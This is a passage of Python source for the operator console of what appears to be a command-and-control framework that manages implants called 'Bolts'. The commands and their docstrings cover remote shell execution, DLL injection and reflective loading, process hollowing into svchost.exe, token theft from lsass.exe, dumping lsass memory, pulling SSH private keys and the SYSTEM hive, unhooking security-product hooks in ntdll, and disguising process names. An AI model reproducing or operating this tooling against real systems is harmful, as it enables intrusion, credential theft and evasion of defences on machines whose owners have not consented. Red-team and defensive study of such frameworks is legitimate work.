        Attempts to force kill a process by it's Process ID (PID) or image name.

        Examples:
            kill 1337
            kill explorer.exe
        """
        if len(n) == 0:
            return print("kill <pid|name>")
        p, v = None, None
        try:
            p = int(n)
        except ValueError:
            v = n
        self._exec(self.shell.cirrus.task_io_kill, pid=p, name=v)
        del p
        del v

    def default(self, c):
        self.do_run(c)

    def do_chan(self, v):
        """
        chan [boolean]

        Enable/Disable channel mode. If no option is specified, enable channel
        mode (if not already enabled). Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Examples:
            chan
            chan true
            chan disable
        """
        if len(v) == 0:
            return self._system("chan")
        self._system(f"chan {str(_is_bool_true(v)).lower()}")

    def do_dll(self, *a):
        """
        dll [-d|--detach] [-r|--reflect] <[!]local_file|remote_file>

        (Windows systems only!)

        Loads a DLL into memory of a process.

        If the "-d" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The behavior of this command is affected by the specified path.

        If the path is prefixed with an exclamation point "!", attempts to
        |  read the file locally will occur and will fail if the file is not
        |  found. Otherwise, the file contents will be loaded into memory and
        |  sent to the client.
        |  If the "-r" or "--reflect" argument is used, the server will convert
        |  the DLL to shellcode and run it on the client as assembly, otherwise
        |  the file will be written to a temp folder on disk and loaded directly.

        If the path does NOT start with an exclamation point, the initial
        |  search will happen locally and if the path exists, the above block will
        |  occur instead, otherwise the path will be sent to the client to load
        |  the path directly from disk.
        |  NOTE: The "-r" or "--reflect" argument is ignored in this scenario.

        The owning process of this thread can be controlled by the shell filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        Examples:
            dll !/tmp/implant.dll
            dll -r /tmp/malware.dll
            dll C:/Windows/malware.dll
        """
        if len(a) == 0:
            return print("dll [-d|--detach] [-r|--reflect] <[!]local_file|remote_file>")
        r = _PARSERS[3].parse_args(a)
        r.dll[0]
        if r.dll is None or len(r.dll) == 0 or not nes(r.dll[0]):
            return print("dll [-d|--detach] [-r|--reflect] <[!]local_file|remote_file>")
        self._exec(
            self.shell.cirrus.task_dll,
            file=r.dll[0],
            reflect=r.reflect,
            raw=None,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_last(self, _):
        """
        last

        Display the last time the client connected.
        """
        try:
            s, t = self.shell.cirrus.session(self.id), datetime.now()
            print(f'Last: {time_str(t, s["last"], True)}')
            del s
            del t
        except ValueError as err:
            print(f"[!] {err}!")

    def do_sleep(self, v):
        """
        sleep [duration]

        Update the sleep value for the client. The duration string by default is
        in seconds, but can be suffixed with a 'm', 'h' or 's' to indicate
        minutes, hours or seconds, respectively.

        If a forward slash "/" is specified, the jitter value may also be updated
        at the same time. (The percent symbol "%" may be included or omitted.

        If no value is specified, this displays the current sleep value.

        Examples:
            sleep
            sleep 5s
            sleep 2m
            sleep 30s/50
            sleep 15s/20
        """
        if len(v) == 0:
            try:
                s = self.shell.cirrus.session(self.id)
                print(f'Sleep is set to: {int(int(s["sleep"])//1000000000)}s')
                del s
            except ValueError as err:
                print(f"[!] {err}!")
            return
        self._system(f"sleep {v}")

    def do_shell(self, c):
        """
        shell <command>

        Executes a command on the client as a shell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of system shell automatically.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The period symbol "." can be prefixed to a raw command instead to run as
        a shell command instead of using this function.

        Examples:
            shell pwd
            shell set
            .whoami
            .dir
        """
        if len(c) == 0:
            return print("shell <command>")
        self.do_run(f".{c}")

    def do_touch(self, p):
        """
        touch <remote_path>

        Creates an empty file at the remote destination, if it does not already
        exist.

        Environment variables are processed on the client.

        Examples:
            touch C:/new-file.txt
        """
        if len(p) == 0:
            return print("touch <remote_path>")
        self._exec(self.shell.cirrus.task_io_touch, path=p)

    def do_jitter(self, v):
        """
        jitter [percentage %]

        Update the jitter percentage value for the client. The specified value
        can include or omit the percentage sign "%".

        If no value is specified, this displays the current jitter percentage.

        Examples:
            jitter
            jitter 50
            jitter 15
        """
        if len(v) == 0:
            try:
                s = self.shell.cirrus.session(self.id)
                print(f'Jitter is set to: {s["jitter"]}%')
                del s
            except ValueError as err:
                print(f"[!] {err}!")
            return
        self._system(f"jitter {v}")

    def do_parent(self, n):
        """
        parent [pid|name1,name2,nameX...]

        Displays/sets the current parent filter status and values.

        If the argument is not empty or omitted, it will be checked as a name/list
        or PID and set if either are correct. Otherwise this function just displays
        the parent filter status.

        Examples:
            parent
            parent 1337
            parent svchost.exe
        """
        if len(n) > 0:
            if self.filter is None:
                self.filter = Filter()
            try:
                p = int(n)
            except ValueError:
                self.filter.include = _split_list(n)
            else:
                if p <= 0:
                    return print("[!] PID must be greater than zero!")
                self.filter.pid = p
                del p
        if self.filter is None:
            print("[+] Parent Filter:\n   <empty>")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")

    def do_mounts(self, _):
        """
        mounts

        Lists all mounted drives and/or shares connected to the client.
        """
        self._system("mounts")

    def do_zombie(self, *a):
        """
        zombie [-d|--detach] <local_file> <fake_args>

        (Windows systems only!)

        Reads the filepath from the local (non-client) filesystem as binary data
        and will run it in memory in a sacrificial suspended process. The zombie
        process binary must exist but can have any arguments.

        If the "-d" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        If the file is a compiled DLL, this will convert it to shellcode on the
        server side before being sent to the client.

        Examples:
            zombie /home/hackerman/gibson.bin svchost.exe -k LocalSystemNetworkRestricted -p -s
            zombie /tmp/malware.dll notepad.exe this-file-does-not-exist.txt
        """
        if len(a) < 2:
            return print("zombie [-d|--detach] <local_file> <fake_args>")
        r = _PARSERS[7].parse_args(a)
        if r.file is None or len(r.file) == 0 or not nes(r.file[0]):
            return print("zombie [-d|--detach] <local_file> <fake_args>")
        if r.args is None or len(r.args) == 0 or not nes(r.args[0]):
            return print("zombie [-d|--detach] <local_file> <fake_args>")
        self._exec(
            self.shell.cirrus.task_zombie,
            file=r.file[0],
            fake_args=" ".join(r.args),
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_cp(self, p, dst):
        """
        cp <remote_source> <remote_dest>

        Copies a file from the specified remote path to the remote destination.
        The copy will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            cp C:/file1 C:/file2
        """
        if not nes(p) or not nes(dst):
            return print("cp <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_io_copy, src=p, dst=dst)

    def do_mv(self, p, dst):
        """
        mv <remote_source> <remote_dest>

        Moves a file from the specified remote path to the remote destination.
        The move will overrite any file present at the destination path.

        Environment variables are processed on the client.

        Examples:
            mv C:/file2 C:/file3
        """
        if not nes(p) or not nes(dst):
            return print("mv <remote_source> <remote_dest>")
        self._exec(self.shell.cirrus.task_io_move, src=p, dst=dst)

    def do_profile(self, n):
        """
        profile <name>

        Sets the client profile to the profile specified by the supplied name.

        Examples:
            profile my-profile
        """
        if len(n) == 0:
            return print("profile <name>")
        self._exec(self.shell.cirrus.task_profile, profile=n)

    def do_pull(self, u, d):
        """
        pull <url> <remote_path>

        Downloads the file at the supplied URL (as the client) and save it to
        the specified remote path.

        Examples:
            pull google.com/robots.txt C:/robots.txt
        """
        if not nes(u) or not nes(d):
            return print("pull <url> <remote_path>")
        self._exec(self.shell.cirrus.task_pull, url=u, dest=d)

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        try:
            f(self.id, **a)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_elevate(self, v):
        """
        elevate [pid|name]

        (Windows systems only!)

        Attempt to steal and use a token from the target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            elevate
            elevate 1337
            elevate lsass.exe
            elevate winlogon.exe
        """
        self._system_filter("elevate", v)

    def do_refresh(self, _):
        """
        refresh

        Refresh the client's system information and return the results back to
        the server.
        """
        self._system("refresh")

    def do_procname(self, n):
        """
        procname <name>

        (*nix systems only!)

        Attempts to rename the process arguments to the provided string. The
        value cannot be longer than the current process name and will be silently
        truncated if it's larger.

        Examples:
            procname apache2
            procname [kernel]
        """
        if len(n) == 0:
            return print("procname <name>")
        self._system(f"procname {n}")

    def do_regedit(self, *a):
        """
        regedit <action> [-f|--force] <key> [value] [type] [data]

        (Windows systems only!)

        Retrieve, delete or modify data on the client system's registry.

        The action argument specifies what to do and how many paramaters are
        required

        Actions:
        get
        |  Retrieve the data and type of the supplied key and value. The "value"
        |  option is required, use an empty string to specify the "(Default)" value.
        ls|dir
        |  Retreive a listing of the keys and values for the supplied key path.
        |  If "value" is specified, this will behave like a "get" action.
        set|edit|update
        |  Set and/or update the registry value. If the value does not exist,
        |  create it. Any keys in the path will also be created. This option
        |  requires the "value" and "type" arguments to be specified, use an empty
        |  string to specify the "(Default)" value. If "data" is omitted, this
        |  will set the value as empty.
        rm|rem|del|delete
        |  Delete the specified key or value (if "value" is not omitted). This
        |  will only delete non-empty keys if the "-f" or "--force" argument is
        |  specified.

        Type can be one of the following:
        - sz|string: "data" must be a string.
        - bin|binary: "data" must be a base64 encoded string.
        - dword|uint32: "data" must be a integer.
        - qword|uint64: "data" must be a integer.
        - multi|multi_sz: "data" must be a string, separate multiple entries with
          '\\n' (newline).
        - exp_sz|expand_string: "data" must be a string

        The "key" argument takes both "reg.exe" and PowerShell registry hive
        name conventions (ex: "HKLM:\\System" and "HKLM\\System" are equal.)

        If "key" or "value" have spaces, they must be enclosed in single or
        double quotes.

        Examples:
            regedit del "HKCU:\\Control Panel\\Desktop\\My Key"
            regedit set "HKCU:\\Control Panel\\Desktop" "Wallpaper" string "C:\\lol.jpg"
            regedit ls "HKCU:\\System\\CurrentControlSet\\Services"
        """
        if len(a) < 2:
            return print(
                "regedit <ls|get|set|del> [-f|--force] <key> [value] [type] [data]"
            )
        r = _PARSERS[2].parse_args(a)
        if len(r.action) == 0 or len(r.key) == 0:
            return print(
                "regedit <ls|get|set|del> [-f|--force] <key> [value] [type] [data]"
            )
        self._exec(
            self.shell.cirrus.task_registry,
            action=r.action[0].lower(),
            key=r.key[0],
            value=_grab_first(r.value),
            type=_grab_first(r.exp),
            data=_grab_first(r.data),
            force=r.force,
        )
        del r

    def do_rev2self(self, _):
        """
        rev2self

        (Windows systems only!)

        Revert the token status to before any impersonation occurred. This would
        be used to reset permissions after finished with an "elevate" command.
        """
        self._system("rev2self")

    def do_set_hide(self, v):
        """
        set_hide [boolean]

        Enable/Disable global shell command visibility. If no option is specified,
        command windows are hidden. Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Examples:
            set_hide
            set_hide no
            set_hide true
        """
        if self.filter is None:
            self.filter = Filter()
        n = True
        if len(v) > 0:
            n = _is_bool_true(v)
        n = not n
        print(f"[+] Set Show Window: {self.show} => {n}.")
        self.show = n
        del n

    def do_write(self, d, p):
        """
        write <string> <remote_path>

        Write the supplied string contents to the remote path. This will overrite
        the contents if the current path exists.

        Examples:
            write "hello world!" C:/hello.txt
        """
        if not nes(p):
            return print("write <string> <remote_path>")
        if not isinstance(d, str):
            d = ""
        self._exec(
            self.shell.cirrus.task_upload, target=None, dest=p, raw=d.encode("UTF-8")
        )

    def do_check_dll(self, d):
        """
        check_dll <dll_name|dll_path>

        (Windows systems only!)

        Inspect the memory region of the supplied DLL name or path to determine
        if any hooks are present.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32.

        The ".dll" extension may also be omitted regardless of full path or name.

        Examples:
            check_dll ntdll
            check_dll ntdll.dll
            check_dll C:/Windows/SysWOW64/shell32.dll
            check_dll C:/Windows/SysWOW64/user32
        """
        if len(d) == 0:
            return print("check_dll <dll_name|dll_path>")
        if not d.endswith(".dll"):
            d = d + ".dll"
        self._system(f"check-dll {d}")

    def do_upload(self, f, p):
        """
        upload <local_file> <remote_path>

        Upload a local file to the client at the supplied remote_path.

        Environment variables are processed on the client (for the remote_path).

        Examples:
            upload ~/hacker_file.txt C:/file.txt
            upload note.txt $USERPROFILE/Desktop/note.txt
        """
        if not nes(f) or not nes(p):
            return print("upload <local_file> <remote_path>")
        self._exec(self.shell.cirrus.task_upload, target=f, dest=p)

    def do_parent_pid(self, v):
        """
        parent_pid [pid]

        Set the global parent filter PID. If the PID argument is omitted or empty,
        the PID value is cleared.

        PID settings on filters take precedence over all other settings.

        This command changes the behavior of all command based functions and will
        attempt to target the specified PID. If the PID no longer exists, all
        commands ran will fail with an error.

        Examples:
            parent_pid
            parent_pid 1337
        """
        if self.filter is None:
            self.filter = Filter()
        if len(v) == 0:
            self.filter.pid = None
        else:
            try:
                p = int(v)
            except ValueError:
                return print(f'[!] PID "{v}" is not a valid integer!')
            if p <= 0:
                return print("[!] PID must be greater than zero!")
            self.filter.pid = p
            del p
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def do_screenshot(self, d):
        """
        screenshot [output_file]

        (Windows systems only!)

        Takes a screenshot of the current desktop. This may fail if the client
        is running in a service context. The file is saved as a PNG to the
        supplied local path. If the path is empty, or omitted, a path based
        on the current directory and the Bolt ID will be used instead.

        Examples:
            screenshot
            screenshot ~/screenshot-1.png
        """
        self._system("screenshot", out=d)

    def do_reload_dll(self, d):
        """
        reload_dll <dll_name|dll_path>

        (Windows systems only!)

        Overwrite the memory region of the specified DLL with the contents on the
        filesystem, eliminating any hooks placed on DLL functions.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32.

        The ".dll" extension may also be omitted regardless of full path or name.

        Examples:
            reload_dll ntdll
            reload_dll ntdll.dll
            reload_dll C:/Windows/SysWOW64/shell32.dll
            reload_dll C:/Windows/SysWOW64/user32
        """
        if len(d) == 0:
            return print("reload_dll <dll_name|dll_path>")
        if not d.endswith(".dll"):
            d = d + ".dll"
        self._system(f"reload-dll {d}")

    def do_download(self, f, p):
        """
        download <remote_file> [local_path]

        Download a remote file. If the local path is non-empty and not omitted,
        the downloaded contents will be saved to that local path. Otherwise the
        contents of the file will be displayed on screen, similar to the "cat"
        command.

        Environment variables are processed on the client (for the remote_path).

        Examples:
            download /root/.ssh/id_rsa ~/keys.pem
            download C:/important-file.txt
            download C:/Windows/system32/config/SYSTEM system.reg
        """
        if not nes(f):
            return print("download <remote_file> [local_path]")
        self._exec(self.shell.cirrus.task_download, target=f, dest=p)

    def do_procdump(self, v, o):
        """
        procdump [pid|name]

        Dump the memory of a target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            procdump
            procdump 1337
            procdump httpd
            procdump lsass.exe
        """
        self._system_filter("procdump", v, o)

    def do_parent_name(self, v):
        """
        parent_name [name1,name2,nameX...]

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        This function is an alias of "parent_include" and inverse of "parent_exclude".

        Examples:
            parent_name
            parent_name explorer.exe
            parent_name winlogon.exe,lsass.exe
        """
        self.do_parent_include(v)

    def prompt(self, args=None):
        self.id = args
        self.filter = None
        return f" > Bolts > {args} > "

    def do_parent_clear(self, _):
        """
        parent_clear

        Clears the global parent filter.

        This command changes the behavior of all command based functions and will
        set the filter behavior back to the default (native).
        """
        self.filter.clear()
        self.filter = None
        print("[+] Parent Filter Cleared.")

    def do_parent_desktop(self, v):
        """
        parent_desktop [boolean]

        Set the global parent filter desktop/session target. A "true" value
        represents a process that is running in a user session and most likely
        has a desktop. "false" values target processes that do NOT have a desktop,
        such as services or lsass.exe.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the desktop/filter option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_desktop
            parent_desktop no
            parent_desktop true
        """
        if self.filter is None:
            self.filter = Filter()
        if len(v) > 0:
            self.filter.session = _is_bool_true(v)
        else:
            self.filter.session = None
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def do_parent_include(self, v):
        """
        parent_include [name1,name2,nameX...]

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        Inverse of "parent_exclude".

        Examples:
            parent_include
            parent_include explorer.exe
            parent_include winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        self.filter.include = _split_list(v)
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def do_parent_exclude(self, v):
        """
        parent_exclude [name1,name2,nameX...]

        Set the global parent filter excluded target names. These represent the
        process names that CANNOT be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that does not match (case-insensitive)
        any in the supplied list. If none are found, all commands ran will fail
        with an error.

        Inverse of "parent_include".

        Examples:
            parent_exclude
            parent_exclude explorer.exe
            parent_exclude winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        self.filter.exclude = _split_list(v)
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def completenames(self, n, *_):
        return _menu(n, _MenuBolt._MENU)

    def complete_help(self, n, *_):
        return _menu(n, _MenuBolt._MENU)

    def do_parent_elevated(self, v):
        """
        parent_elevated [boolean]

        Set the global parent filter elevation target. A "true" value represents
        a process that is running in a system or high integrity. "false" values
        target processes that run with lower than high integrity (non-elevated).

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the elevation option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_elevated
            parent_elevated no
            parent_elevated true
        """
        if self.filter is None:
            self.filter = Filter()
        if len(v) > 0:
            self.filter.elevated = _is_bool_true(v)
        else:
            self.filter.elevated = None
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def do_parent_fallback(self, v):
        """
        parent_fallback [boolean]

        Set the global parent filter fallback setting. A "true" value indicates
        that this parent filter can fallback to less restrictive settings if the
        first run did not find any valid targets. "false" values disable the
        ability for fallbacks to occur.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and
        while less restrictive on targets, this provides better protection from
        command failures if a target is not found.

        Examples:
            parent_fallback
            parent_fallback no
            parent_fallback true
        """
        if self.filter is None:
            self.filter = Filter()
        if len(v) > 0:
            self.filter.fallback = _is_bool_true(v)
        else:
            self.filter.fallback = None
        print(f"[+] Parent Filter Updated:\n   {self.filter}")

    def complete_profile(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_regedit(self, n, c, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 1:
            return _menu(n, _MenuBolt._MENU_REGEDIT)
        return _EMPTY

    def _system_filter(self, c, v, out=None):
        if not nes(v):
            return self._system(c)
        if "/" in v or "\\" in v or v.endswith(".dump"):
            return self._system(c, out=v)
        self._system(c, out=out, filter=_quick_filter(v))

    def _system(self, c, filter=None, out=None):
        if filter is None:
            return self._exec(
                self.shell.cirrus.task_system, cmd=c, out=out, filter=self.filter
            )
        self._exec(self.shell.cirrus.task_system, cmd=c, out=out, filter=filter)


class _MenuBolts(object):
    _MENU = [
        "all",
        "back",
        "delete",
        "exit",
        "help",
        "info",
        "list",
        "ls",
        "main",
        "shutdown",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, n):
        self.do_list(n)

    def do_all(self, _):
        self.shell.set_menu(MENU_BOLT_ALL)

    def do_list(self, n):
        try:
            self.shell.cirrus.show_sessions(exp=Exp.parse(n))
        except ValueError as err:
            print(f"[!] {err}")

    def do_info(self, n):
        try:
            if len(n) == 0:
                return self.shell.cirrus.show_info(all=True)
            if ":" in n:
                return self.shell.cirrus.show_info(all=True, exp=Exp.parse(n))
            self.shell.cirrus.show_info(n)
        except ValueError as err:
            print(f"[!] {err}!")

    def default(self, n):
        if len(n) == 0:
            return
        try:
            self.shell.cirrus.session(n)
        except ValueError:
            return print(f'[!] Bolt "{n}" does not exist!')
        self.shell.set_menu(MENU_BOLT, n.upper())

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <id>|all")
        try:
            if n == "all":
                if not _do_ask("Confirm delete of ALL Bolts?"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.sessions():
                    self.shell.cirrus.session_remove(e["id"], False)
                print("[+] Deleted all Bolts!")
            else:
                self.shell.cirrus.session_remove(n, False)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._bolts = None
        self.shell.set_menu(MENU_BOLTS)

    def do_shutdown(self, n):
        if len(n) == 0:
            return print("delete <id>|all")
        try:
            if n == "all":
                if not _do_ask("Confirm shutdown of ALL Bolts?"):
                    return print("[-] Aborting shutdown!")
                for e in self.shell.cirrus.sessions():
                    self.shell.cirrus.session_remove(e["id"], True)
                print("[+] Triggered shutdown on all Bolts!")
            else:
                self.shell.cirrus.session_remove(n, True)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._bolts = None
        self.shell.set_menu(MENU_BOLTS)

    def prompt(self, args=None):
        return " > Bolts > "

    def completenames(self, n, *_):
        return _menu(n, _MenuBolts._MENU + self.shell.cache.bolts(n), True)

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def complete_shutdown(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)


class _MenuProfile(object):
    _MENU = [
        "back",
        "base64",
        "bin",
        "delete",
        "edit",
        "exit",
        "export",
        "help",
        "json",
        "main",
        "replace",
        "show",
        "update",
    ]

    def __init__(self, shell):
        self.name = None
        self.shell = shell
        self.quick_back = True

    def do_bin(self, _):
        try:
            self.shell.cirrus.show_profile(self.name, as_bytes=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_back(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_json(self, _):
        try:
            print(
                dumps(
                    self.shell.cirrus.profile(self.name).json(),
                    sort_keys=False,
                    indent=4,
                )
            )
        except ValueError as err:
            print(f"[!] {err}!")

    def do_show(self, _):
        try:
            self.shell.cirrus.show_profile(self.name)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_edit(self, _):
        # TODO(dij): Work on
        print("TODO")

    def do_delete(self, _):
        try:
            self.shell.cirrus.profile_delete(self.name)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None
        self.shell.set_menu(MENU_PROFILES)

    def do_base64(self, _):
        try:
            print(b64encode(self.shell.cirrus.profile(self.name)).decode("UTF-8"))
        except ValueError as err:
            print(f"[!] {err}!")

    def do_update(self, d):
        self._update("update", d)

    def do_replace(self, d):
        self._update("replace", d)

    def do_export(self, file):
        try:
            p = self.shell.cirrus.profile(self.name)
            if not nes(file):
                print(b64encode(p).decode("UTF-8"))
            else:
                with open(expanduser(expandvars(file)), "wb") as f:
                    f.write(p)
                print(f'[+] Written to "{file}".')
            del p
        except (ValueError, OSError) as err:
            print(f"[!] {err}!")

    def prompt(self, args=None):
        self.name = args
        return f" > Profiles > {args} > "

    def _update(self, name, data):
        if not nes(data):
            return print(f"{name} <file|base64|json>")
        if data[0] == "[" and data[-1] == "]":
            try:
                c = Config()
                c.parse(data)
            except ValueError as err:
                return print(f"[!] {err}!")
        else:
            try:
                c = Config(b64decode(data, validate=True))
            except ValueError:
                p = expanduser(expandvars(data))
                if not isfile(p):
                    del p
                    return print(f'[!] File "{data}" does not exist!')
                with open(p, "rb") as f:
                    c = Config(f.read())
                del p
        try:
            self.shell.cirrus.profile_update(self.name, c)
            print(f'[+] Profile "{self.name}" updated!')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None
        del c

    def completenames(self, n, *_):
        return _menu(n, _MenuProfile._MENU)


class _MenuProfiles(object):
    _MENU = [
        "back",
        "base64",
        "bin",
        "bolts",
        "delete",
        "edit",
        "exit",
        "export",
        "help",
        "import",
        "json",
        "list",
        "listeners",
        "ls",
        "main",
        "new",
        "replace",
        "show",
        "update",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, _):
        return self.do_list(_)

    def do_bin(self, n):
        if len(n) == 0:
            return print("bin <name>")
        try:
            self.shell.cirrus.show_profile(n, as_bytes=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_new(self, n):
        if len(n) == 0:
            return print("new <name>")
        # TODO(dij): Work on
        print("TODO")
        self.shell.cache._profiles = None

    def do_list(self, _):
        try:
            return self.shell.cirrus.show_profiles()
        except ValueError as err:
            print(f"[!] {err}!")

    def default(self, n):
        if len(n) == 0:
            return
        try:
            self.shell.cirrus.profile(n)
        except ValueError:
            return print(f'[!] Profile "{n}" does not exist!')
        self.shell.set_menu(MENU_PROFILE, n.lower())

    def do_edit(self, n):
        if len(n) == 0:
            return print("edit <name>")
        # TODO(dij): Work on
        print("TODO")

    def do_json(self, n):
        if len(n) == 0:
            return print("json <name|all>")
        try:
            if n == "all":
                for k, p in self.shell.cirrus.profiles().items():
                    print(f"{k}\n{dumps(p.json(), sort_keys=False)}")
                return
            print(
                dumps(
                    self.shell.cirrus.profile(n).json(),
                    sort_keys=False,
                    indent=4,
                )
            )
        except ValueError as err:
            print(f"[!] {err}!")

    def do_show(self, n):
        if len(n) == 0:
            return print("show <name|all>")
        try:
            if n == "all":
                e = list(self.shell.cirrus.profiles().keys())
                for x in range(0, len(e)):
                    if x > 0:
                        print()
                    self.shell.cirrus.show_profile(e[x])
                del e
                return
            return self.shell.cirrus.show_profile(n)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <name|all>")
        try:
            if n == "all":
                if not _do_ask("Confirm deletion of ALL Profiles?"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.profiles().keys():
                    self.shell.cirrus.profile_delete(e)
                    print(f'[+] Deleted Profile "{e}".')
                print("[+] All Profiles deleted!")
            else:
                self.shell.cirrus.profile_delete(n)
                print(f'[+] Deleted Profile "{n}".')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None

    def do_base64(self, n):
        if len(n) == 0:
            return print("base64 <name|all>")
        try:
            if n == "all":
                for k, p in self.shell.cirrus.profiles().items():
                    print(f'{k+":":<21}{b64encode(p).decode("UTF-8")}')
                return
            print(b64encode(self.shell.cirrus.profile(n)).decode("UTF-8"))
        except ValueError as err:
            print(f"[!] {err}!")

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def prompt(self, args=None):
        return " > Profiles > "

    def do_import(self, n, data):
        self._import_update("import", n, data, True)

    def do_update(self, n, data):
        self._import_update("update", n, data, True)

    def do_replace(self, n, data):
        self._import_update("replace", n, data, True)

    def complete_bin(self, n, *_):
        return self.shell.cache.profiles(n)

    def completenames(self, n, *_):
        return _menu(n, _MenuProfiles._MENU + self.shell.cache.profiles(n))

    def complete_edit(self, n, *_):
        return self.shell.cache.profiles(n)

    def complete_json(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_show(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_base64(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def do_export(self, n, file=None):
        if not nes(n):
            return print("export <name> [file]")
        try:
            p = self.shell.cirrus.profile(n)
            if not nes(file):
                print(b64encode(p).decode("UTF-8"))
            else:
                with open(expanduser(expandvars(file)), "wb") as f:
                    f.write(p)
                print(f'[+] Written to "{file}".')
            del p
        except (ValueError, OSError) as err:
            print(f"[!] {err}!")

    def complete_export(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return list()

    def complete_update(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return list()

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return list()

    def _import_update(self, name, n, data, new=True):
        if not nes(n) or not nes(data):
            return print(f"{name} <name> <file|base64|json>")
        if data[0] == "[" and data[-1] == "]":
            try:
                c = Config()
                c.parse(data)
            except ValueError as err:
                return print(f"[!] {err}!")
        else:
            try:
                c = Config(b64decode(data, validate=True))
            except ValueError:
                p = expanduser(expandvars(data))
                if not isfile(p):
                    del p
                    return print(f'[!] File "{data}" does not exist!')
                with open(p, "rb") as f:
                    c = Config(f.read())
                del p
        try:
            if new:
